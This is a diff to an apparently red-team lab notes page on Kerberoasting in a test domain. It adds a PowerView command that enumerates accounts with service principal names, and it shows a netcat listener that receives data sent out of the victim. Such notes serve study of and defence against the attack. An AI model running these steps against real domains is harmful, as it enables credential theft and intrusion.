@@ -20,6 +20,18 @@ nc -lvp 443 > kerberoast.bin
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+Attacker enumerating user accounts with `serverPrincipalName` set:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
+```csharp
+Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+![](../.gitbook/assets/kerberoast-enumeration.png)
+
 Attacker retrieving a kerberos ticker for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`:
 
 {% code-tabs %}
